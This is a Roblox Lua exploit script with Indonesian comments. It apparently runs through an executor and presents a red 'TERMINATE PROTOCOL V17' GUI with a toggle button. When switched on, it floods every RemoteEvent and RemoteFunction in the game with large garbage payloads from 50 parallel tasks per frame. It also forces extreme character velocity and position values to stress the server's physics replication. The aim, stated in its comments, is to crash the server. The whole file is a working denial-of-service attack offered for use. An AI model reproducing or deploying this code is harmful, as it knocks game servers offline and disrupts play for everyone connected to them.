local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

-- UI CLEANUP
if CoreGui:FindFirstChild("Ikyy_EXTERMINATOR") then CoreGui:FindFirstChild("Ikyy_EXTERMINATOR"):Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Ikyy_EXTERMINATOR"
ScreenGui.Parent = CoreGui

-- UI DESIGN (AGGRESSIVE RED)
local Main = Instance.new("Frame")
Main.Size = UDim2.new(0, 240, 0, 160)
Main.Position = UDim2.new(0.5, -120, 0.5, -80)
Main.BackgroundColor3 = Color3.fromRGB(5, 0, 0)
Main.Parent = ScreenGui
local Corner = Instance.new("UICorner") Corner.CornerRadius = UDim.new(0, 10) Corner.Parent = Main
local Stroke = Instance.new("UIStroke") Stroke.Thickness = 3 Stroke.Color = Color3.fromRGB(255, 0, 0) Stroke.Parent = Main

local Title = Instance.new("TextLabel")
Title.Text = "TERMINATE PROTOCOL V17"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.BackgroundTransparency = 1
Title.Parent = Main

local BrutalBtn = Instance.new("TextButton")
BrutalBtn.Size = UDim2.new(0, 200, 0, 60)
BrutalBtn.Position = UDim2.new(0.5, -100, 0.5, -10)
BrutalBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
BrutalBtn.Text = "ENGAGE BRUTAL MODE"
BrutalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
BrutalBtn.Font = Enum.Font.GothamBold
BrutalBtn.TextSize = 13
BrutalBtn.Parent = Main
local BCorner = Instance.new("UICorner") BCorner.CornerRadius = UDim.new(0, 8) BCorner.Parent = BrutalBtn

-- LOGIKA BRUTAL (THE EXTERMINATOR)
local Active = false
local Garbage = string.rep("\255", 20000) -- Karakter biner berat (Memory Stress)
local TableHell = {}
for i = 1, 500 do table.insert(TableHell, {["Crash"] = Garbage, ["ID"] = math.random()}) end

local function KillServer()
    while Active do
        -- STEP 1: PARALLEL REMOTE BOMBARDMENT
        for i = 1, 50 do -- 50 Kali lipat per loop (Brutal)
            task.spawn(function()
                for _, r in pairs(game:GetDescendants()) do
                    if not Active then break end
                    if r:IsA("RemoteEvent") then
                        -- Mengirim 3 Argumen Berat Sekaligus
                        r:FireServer(TableHell, Garbage, Vector3.new(math.huge, math.huge, math.huge))
                    elseif r:IsA("RemoteFunction") then
                        -- RemoteFunction dikirim tanpa menunggu (Async)
                        task.spawn(function() pcall(function() r:InvokeServer(TableHell) end) end)
                    end
                end
            end)
        end
        
        -- STEP 2: PHYSICS ENGINE STRESS (CLIENT-TO-SERVER REPLICATION)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            pcall(function()
                -- Memaksa server menghitung posisi mustahil secara konstan
                LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(1e32, 1e32, 1e32)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0)
            end)
        end
        
        task.wait() -- Tanpa angka di wait() = Secepat refresh rate (BRUTAL)
    end
end

BrutalBtn.MouseButton1Click:Connect(function()
    Active = not Active
    if Active then
        BrutalBtn.Text = "TERMINATING..."
        BrutalBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        BrutalBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
        task.spawn(KillServer)
    else
        BrutalBtn.Text = "ENGAGE BRUTAL MODE"
        BrutalBtn.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
        BrutalBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

-- DRAG LOGIC
local d; local di; local ds; local sp
Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = true ds = i.Position sp = Main.Position end end)
Main.InputChanged:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then di = i end end)
UserInputService.InputChanged:Connect(function(i) if i == di and d then local del = i.Position - ds Main.Position = UDim2.new(sp.X.Scale, sp.X.Offset + del.X, sp.Y.Scale, sp.Y.Offset + del.Y) end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then d = false end end)
